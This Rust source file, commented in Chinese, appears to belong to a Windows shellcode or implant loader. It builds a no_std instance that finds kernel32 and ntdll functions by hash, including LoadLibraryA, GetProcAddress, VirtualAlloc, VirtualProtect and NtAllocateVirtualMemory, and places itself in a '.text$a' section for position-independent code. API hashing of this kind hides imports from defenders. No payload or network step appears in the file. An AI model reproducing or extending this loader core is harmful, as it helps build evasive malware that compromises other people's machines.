
extern crate alloc;

use alloc::string::{String, ToString};
use alloc::collections::BTreeMap;
use alloc::vec::Vec;
use core::alloc::{GlobalAlloc, Layout};
// 用 BTreeMap 替代 HashMap
use core::ffi::c_void;
use core::ptr::null_mut;

// #[global_allocator]
// static ALLOC: wee_alloc::WeeAlloc = wee_alloc::WeeAlloc::INIT;

use linked_list_allocator::LockedHeap;
#[global_allocator]
pub static ALLOCATOR: LockedHeap = LockedHeap::empty();

// 定义全局实例
define_lazy_static_instance!(GLOBAL_INSTANCE,INSTANCE,INSTANCE::new());

#[allow(dead_code)]
/*
    创建、初始化实例
*/

use crate::core_link::bootstrapper::config::{get_dll, get_func_api};
use crate::core_link::bootstrapper::utils::{HASH_GET_PROC_ADDRESS, HASH_KERNEL32, HASH_LOAD_LIBRARY_A, HASH_NT_ALLOCATE_VIRTUAL_MEMORY, HASH_NTDLL, HASH_VIRTUAL_ALLOC, HASH_VIRTUAL_PROTECT, HASH_WINHTTP};
use crate::define_lazy_static_instance;

type Funcptr = *const c_void;

#[repr(C)]
#[derive(Debug, Clone)]
pub struct WINAPI {
    pub libs: BTreeMap<u32, Funcptr>,
    pub funcs: BTreeMap<u32, Funcptr>,
}

// 为 WINAPI 手动实现 Send
unsafe impl Send for WINAPI {}

// 为 WINAPI 手动实现 Sync
unsafe impl Sync for WINAPI {}

impl WINAPI {
    fn new() -> Self {
        Self {
            libs: BTreeMap::new(),
            funcs: BTreeMap::new(),
        }
    }

    pub unsafe fn load_library(&mut self, hash_module:u32) {
        let dll_base = self.get_dll(hash_module);
        if dll_base != null_mut() {
            self.libs.insert(hash_module, dll_base);
        } else {
            //println!("[-] Not Found {} Addr",dll_name);
        }
    }

    pub unsafe fn load_func_addr(&mut self, hash_module:u32, hash_func :u32) {
        if let Some(&dll_base) = self.libs.get(&hash_module) {
            let func_addr = get_func_api(dll_base, hash_func);
            self.funcs.insert(hash_func, func_addr);
        }
    }

    unsafe fn get_dll(&mut self, hash_module:u32) -> Funcptr {
        get_dll(hash_module)
    }
}


#[repr(C)]
#[derive(Clone)]
// 定义 INSTANCE 结构体
#[link_section = ".text$a"]
pub struct INSTANCE {
    #[link_section = ".text$a"]
    pub win_api: WINAPI,
    #[link_section = ".text$a"]
    pub hash_map: BTreeMap<u32,Vec<u8>>
}
impl INSTANCE {
    pub(crate) fn new() -> Self {
        // 初始化 WINAPI
        let mut win_api = WINAPI::new();
        let mut hash_map = BTreeMap::new();
        // 加载 dll
        unsafe {
            win_api.load_library(HASH_KERNEL32);
            win_api.load_library(HASH_NTDLL);

        }

        // 加载 dll 函数 api
        unsafe {
            // LoadLibrary
            win_api.load_func_addr(HASH_KERNEL32, HASH_LOAD_LIBRARY_A);
            // GetProcAddress
            win_api.load_func_addr(HASH_KERNEL32, HASH_GET_PROC_ADDRESS);
            // //VirtualProtect
            win_api.load_func_addr(HASH_KERNEL32, HASH_VIRTUAL_PROTECT);
            //VirtualAlloc
            win_api.load_func_addr(HASH_KERNEL32,HASH_VIRTUAL_ALLOC);
            // NtAllocateVirtualMemory
            win_api.load_func_addr(HASH_NTDLL, HASH_NT_ALLOCATE_VIRTUAL_MEMORY);
            // User32.dll

        }
        Self { win_api,  hash_map}
    }
}

